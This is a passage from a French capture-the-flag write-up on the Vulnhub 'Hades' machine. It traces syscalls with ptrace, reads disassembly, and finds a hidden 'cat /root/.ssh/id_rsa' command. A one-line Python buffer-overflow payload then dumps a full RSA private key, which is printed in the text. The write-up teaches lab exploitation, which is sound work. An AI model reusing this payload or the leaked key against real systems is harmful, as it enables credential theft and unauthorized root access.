        ptrace(PTRACE_SINGLESTEP, child, NULL, NULL);
        follow_syscall = 0;
      }
    }
  }
  return 0;
}
```

Notez que ce code a été écrit pour du x86. Il est loin d'être parfait (peut entrer dans une boucle infinie) et le compteur de ret ne se met pas à jour si un syscall est rencontré avant le nombre défini de calls à afficher.  

Les plus courageux pourront même coupler ce code avec [Capstone](http://www.capstone-engine.org/) pour avoir un programme top-la-classe qui affiche les instructions assembleur.  

```plain
$ ./call_trace display_key
[*] mmap (90)
[*] readlink (85)
[*] mmap (90)
[*] mprotect (125)
[*] mmap (90)
[*] mprotect (125)
[*] mmap (90)
[*] brk (45)
[*] munmap (91)
[*] unknown (122)
[*] brk (45)
[*] brk (45)
[*] set_thread_area (243)
[*] brk (45)
[*] brk (45)
[*] fstat64 (197)
[*] mmap2 (192)
[*] write (4)

[*] write (4)
	Ready to dance?
[*] write (4)

[*] write (4)
Enter password: 
[*] fstat64 (197)
[*] mmap2 (192)
[*] read (3)
sddfdfe
post-ret [1] EIP: 0x0804c506
post-ret [2] EIP: 0x0804d826
post-ret [3] EIP: 0x080499de
[*] open (5)
[*] fstat64 (197)
[*] mmap2 (192)
[*] read (3)
post-ret [1] EIP: 0x0804c506
post-ret [2] EIP: 0x0804d826
post-ret [3] EIP: 0x08049e14
[*] close (6)
[*] munmap (91)
[*] open (5)
[*] fstat64 (197)
[*] mmap2 (192)
[*] write (4)
[*] close (6)
[*] munmap (91)
[*] exit_group (252)
```

Ici on voit trois appels effectués puis atteindre le read. Les adresses 0x0804c506 et 0x0804d826 sont en commun lors des deux appels.  

Le code qui nous intéresse se trouve donc autour de 0x080499de. On peut commencer à analyser ici :)  

Je n'entrerais pas dans les détails de déboguage du programme : ça s'est fait par tâtonnement avant de tomber sur quelque chose de réellement intéressant.  

Au bout d'un moment on atterri ici :  

```plain
   0x804832d:	push   %ebp
   0x804832e:	mov    %esp,%ebp
   0x8048330:	sub    $0x38,%esp
   0x8048333:	movl   $0x72633353,-0x19(%ebp) ; "S3cr"
   0x804833a:	movl   $0xa217433,-0x15(%ebp)  ; "3t!\n"
   0x8048341:	movb   $0x0,-0x11(%ebp)
   0x8048345:	mov    0x8(%ebp),%eax
   0x8048348:	mov    %eax,0x4(%esp)
   0x804834c:	lea    -0x10(%ebp),%eax
   0x804834f:	mov    %eax,(%esp)
   0x8048352:	call   0x8055450 ; voir fonction suivante
   0x8048357:	lea    -0x19(%ebp),%eax  ; chaine hardcodee
   0x804835a:	mov    %eax,0x4(%esp)
   0x804835e:	lea    -0x10(%ebp),%eax  ; chaine lue
   0x8048361:	mov    %eax,(%esp)
   0x8048364:	call   0x8055410   ; retourne 0 si la chaine
=> 0x8048369:	test   %eax,%eax   ; saisie est égale à S3cr3t!
   0x804836b:	je     0x8048374
   0x804836d:	call   0x8048268 ; gère le compteur
   0x8048372:	jmp    0x8048379
   0x8048374:	call   0x8048268 ; gère le compteur
   0x8048379:	leave
```

Le contenu de la première fonction appelée (pour les curieux) :  

```plain
=> 0x8055450:	push   %ebp
   0x8055451:	xor    %edx,%edx
   0x8055453:	mov    %esp,%ebp
   0x8055455:	mov    0x8(%ebp),%eax
   0x8055458:	push   %esi            ; esi est un pointeur sur fonction
   0x8055459:	mov    0xc(%ebp),%esi
   0x805545c:	push   %ebx
   0x805545d:	lea    -0x1(%eax),%ebx
   0x8055460:	movzbl (%esi,%edx,1),%ecx
   0x8055464:	mov    %cl,0x1(%ebx,%edx,1)
   0x8055468:	add    $0x1,%edx
   0x805546b:	test   %cl,%cl
   0x805546d:	jne    0x8055460
   0x805546f:	pop    %ebx
   0x8055470:	pop    %esi
   0x8055471:	pop    %ebp
   0x8055472:	ret
```

La méthode qui gère le statut du compteur :  

```plain
=> 0x8048268:	push   %ebp
   0x8048269:	mov    %esp,%ebp
   0x804826b:	sub    $0x28,%esp
   0x804826e:	movl   $0x80ab41e,0x4(%esp) ; "rt"
   0x8048276:	movl   $0x80ab421,(%esp)    ; "counter"
   0x804827d:	call   0x8049920            ; ouverture de counter
   0x8048282:	mov    %eax,-0xc(%ebp)
   0x8048285:	mov    -0xc(%ebp),%eax
   0x8048288:	mov    %eax,(%esp)
   0x804828b:	call   0x8049d80            ; lit de caractère (et ferme le fichier ?)
   0x8048290:	mov    %eax,-0x10(%ebp)     ; eax = '0'
   0x8048293:	mov    -0xc(%ebp),%eax
   0x8048296:	mov    %eax,(%esp)
   0x8048299:	call   0x8049490            ; converti en entier (à priori)
   0x804829e:	cmpl   $0x31,-0x10(%ebp)
   0x80482a2:	jg     0x80482aa            ; si > '1'
   0x80482a4:	cmpl   $0x2f,-0x10(%ebp)
   0x80482a8:	jg     0x80482f3            ; si >= '0'
   ====== code appelle si counter == 2 ======
   0x80482aa:	movl   $0x30,-0x10(%ebp)
   0x80482b1:	movl   $0x80ab429,0x4(%esp)
   0x80482b9:	movl   $0x80ab421,(%esp)
   0x80482c0:	call   0x8049920            ; remet le compteur à zéro
   0x80482c5:	mov    %eax,-0xc(%ebp)
   0x80482c8:	mov    -0xc(%ebp),%eax
   0x80482cb:	mov    %eax,0x4(%esp)
   0x80482cf:	mov    -0x10(%ebp),%eax
   0x80482d2:	mov    %eax,(%esp)
   0x80482d5:	call   0x8049c70
   0x80482da:	mov    -0xc(%ebp),%eax
   0x80482dd:	mov    %eax,(%esp)
   0x80482e0:	call   0x8049490
   0x80482e5:	movl   $0x80ab42c,(%esp)    ; "reboot"
   0x80482ec:	call   0x80493a0            ; appelle clone etc
   0x80482f1:	jmp    0x804832b
   ================ fin =====================
   0x80482f3:	addl   $0x1,-0x10(%ebp)     ; counter++
   0x80482f7:	movl   $0x80ab429,0x4(%esp) ; "w+"
   0x80482ff:	movl   $0x80ab421,(%esp)    ; "counter"
   0x8048306:	call   0x8049920
   0x804830b:	mov    %eax,-0xc(%ebp)      ; fichier counter toujours ouvert, tronqué
   0x804830e:	mov    -0xc(%ebp),%eax
   0x8048311:	mov    %eax,0x4(%esp)
   0x8048315:	mov    -0x10(%ebp),%eax
   0x8048318:	mov    %eax,(%esp)
   0x804831b:	call   0x8049c70
   0x8048320:	mov    -0xc(%ebp),%eax
   0x8048323:	mov    %eax,(%esp)
   0x8048326:	call   0x8049490            ; après ce call, le fichier counter
   0x804832b:	leave                       ; contient la nouvelle valeur
   0x804832c:	ret
```

On remarque dans l'algorithme que *reboot* est lancé si à la saisie du mot de passe counter valait 2.  

La saisie de *"S3cr3t!"* n'apporte malheureusement pas grand chose :(  

Si le précédent programme (*loki\_server*) avait encore des anciennes fonctions, celui ci n'est peut-être pas terminé...  

Dans tous les cas on voit cette fois la chaine "reboot" à l'adresse 0x80ab42c.  

Si on cherche les chaines autour de *reboot* :  

```plain
(gdb) x/10s 0x80ab400
0x80ab400:      "\003"
0x80ab402:      ""
0x80ab403:      ""
0x80ab404:      "\001"
0x80ab406:      "\002"
0x80ab408:      "cat /root/.ssh/id_rsa"
0x80ab41e:      "rt"
0x80ab421:      "counter"
0x80ab429:      "w+"
0x80ab42c:      "reboot"
```

On utilise une super fonctionnalité de gdb pour savoir si l'adresse de *"cat /root/.ssh/id\_rsa"* est utilisée dans le code :  

```plain
(gdb) find /b 0x8048000,  0x8048fff, 0x08, 0xb4, 0x0a, 0x08
0x804825d
1 pattern found.
(gdb) x/7i 0x804825d-9
   0x8048254:	push   %ebp
   0x8048255:	mov    %esp,%ebp
   0x8048257:	sub    $0x18,%esp
   0x804825a:	movl   $0x80ab408,(%esp)
   0x8048261:	call   0x80493a0
   0x8048266:	leave  
   0x8048267:	ret
```

On peut exploiter le buffer overflow et mettant comme adresse de retour l'adresse du *movl* :  

```plain
$ python -c 'print "\x5a\x82\x04\x08"*30' | ./display_key

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA4He7ENfrx9lqrkrxy8+1EmRgrg6tfB1NtI0ODDQN5vg3EH+k
d3H/+oD+PHRBd+cClnV24Z82QbdJAPkb2VZYI2OGNrxWiRnoVaRw4XN80WH21+Am
Jvme6DeiS7UYHr/kn+J6/KNmjRrSwxPegHCZsqY8qn06J+++rZQujazmt6ABP2wU
lLGL9iCQO2G92xchMLRXcsBln8XEkTJ90TaNp6bJwdlzZbYV3m/hbco7mybHhQBE
eA9HCvY6d2upFyKUxMzQ3RyZRcabf8PoOLL5QFPRSVXmdnfDfF/7GJkWXWr4mLmW
VB0pcdVTBMI0Am7llHbv0hlI0QdooH/QkmdB8QIDAQABAoIBAQDbn+qVaV6WFMGP
tV5t11XIoBQEWfIenSFZhiX3hLsRgU2HRAysngsilDGs/ubLpWjfxCDEUx4oIGg6
noJEHXpxbcB1L8PPs1yi5xlXTcMTrzFxOSy7N8PmXADc6FyoQYM1eMhzBoGhkFwl
aPxsWT/ZD1QOUCalyqqbdYAzOLgpcnx9YfegakskOMeqlLCUd8P4cs5sHt3yfauf
nhaXmO7HivMn+p61P5oorAuQcgHjWlggMrFVo9yUIsx7/D8lD7v2wKSIbMIGxSnd
smiuWwI3sddy4ztRXgEItFqsFVdmdbjKY6AiqaK3TUvxAwnin+eD0+/GZaCImmU9
DCSQlOiNAoGBAPO0Lave7NT5ikvQAVXZKFozOt219CWg8bot/YeCd2F94SRD2jQ6
cWv/gx2Kg0qnC+STbE733jKb8Y05u5cU86DfBZ8W0c5RtYijq7Hhjul3IrTs0EqQ
HI+DoS2MYTTVNXfpWFhQhevXi/bmFFBbLTtZlDJkeTB2RYuSkq2K1P/fAoGBAOvL
FlaHBs0yqtgbLWM/gUgwYKjlKLxoKdLA2BVz+Bj8csA/wOpxwm6lxBIJIEc34sW9
2qYk2LNndplrgDSwSxQdG/2F0aPLZmxP+IUIupL4kYyCzjyQjUf6dudSCLe6rO6h
HA+kWcoKgLp8OTrZ4lDOlH3u09P3DJeulH0fHLgvAoGAVUoBkdz61a5fkBjD3t+Z
F7hGKcG8KE8jSh0+VWZ7kUsUuDRm8VBi0YEiyfvn5wB/UQenKBvnT57z8pD57e4P
NYXX2c2Kr8I43hEpzZ86/MoNA3S9kNrOpAtVJTOz8WGMzOKFYKMNu3Q8L7Rl95lx
QwweqWQwZZ1+yVIKs2GbGdECgYEA3Repk2q6wu+OaGJbVaN3SsQp7lQptTgKd1Zh
hwQdjvgvdPqSnoIaqPt/9NVf0ceiOH5DpeQI2XfbKhI1vbHMREjjNP4kS2xuVoNJ
6Rv9LdArUdBZJ0r3XpWIpnAyQmykuICSukwF8T+V4saWNwuUfOanL8ogD7GnuhZ1
nzjsCfsCgYEAtSo+SmkHsTrMnnGP3GoBbZDpOaC7NsvFKj5s1CYu8gsSNKgT8vtz
GZYVZzbr4faKheAIll3BXUu0v2fQUJPsRbE8cmMzMrDp9E/6aMUAMCaJ6oxOAxNF
GGvFkdoGMfa4LgP6Nb2JkMQ7w/49jPaJLm5n/ERsmi+58hZX3evyH4Q=
-----END RSA PRIVATE KEY-----
```

Hades pwned :)  

Notez que les solutions alternatives d'exploitation sont réduites par le fait que l'adresse de la commande *cat...* contient un 0x0a (retour à la ligne).  

Une connection SSH plus tard...  

```plain
root@Hades:~# openssl aes-256-cbc -d -in flag.txt.enc -out agadou.txt -pass file:/key_file
root@Hades:~# cat agadou.txt 
Congratulations on completing Hades.

Feel free to ping me on #vulnhub and tell me what you thought.

The PGP key below can be used to encrypt solution submissions, and to prove you got through it all.

-Lok_Sigma

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG/MacGPG2 v2.0.22 (Darwin)
Comment: GPGTools - http://gpgtools.org

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
=tmFl
-----END PGP PUBLIC KEY BLOCK-----
```

C'était fun :)

*Published May 23 2014 at 19:12*